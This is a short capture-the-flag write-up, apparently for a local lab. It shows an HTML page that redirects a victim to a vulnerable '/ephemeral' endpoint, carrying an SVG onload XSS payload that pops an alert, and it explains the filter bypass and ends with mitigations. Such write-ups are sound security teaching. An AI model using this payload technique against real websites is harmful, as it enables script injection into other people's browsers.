# CSRF to XSS Challenge Writeup

## 🧠 Challenge Description

The challenge required exploiting a **CSRF vulnerability** to trigger an **XSS attack** that executes:

```javascript
alert("PWNED")
````

on `http://challenge.localhost`.

---

## ✅ Solution

### 🧪 Exploit Code

```html
<!DOCTYPE html>
<html>
<body>
    <script>
        const payload = "<svg/onload=alert('PWNED')>";
        window.location = `http://challenge.localhost/ephemeral?msg=${encodeURIComponent(payload)}`;
    </script>
</body>
</html>
```

---

### 🔎 Explanation

* The vulnerable `/ephemeral` endpoint reflects the `msg` parameter **without proper encoding**.
* We use an **`<svg>` tag with an `onload` handler** to bypass basic XSS filters.
* The payload is **URL-encoded** to ensure it is safely transmitted.
* `window.location` is used to redirect the victim to the vulnerable page with the malicious payload.

---

### 💡 Why This Works

* SVG tags support JavaScript event handlers and are interpreted as HTML in modern browsers.
* The redirect runs in the **target origin context**, making the XSS effective.
* This method **avoids complications** that might arise with `<iframe>` usage or direct `<script>` tag injection.

---

### 🛡️ Mitigation Recommendations

* **Proper output encoding** for all reflected user input.
* Use **Content Security Policy (CSP)** headers to block inline scripts.
* Implement **CSRF tokens** for all sensitive or state-changing requests.
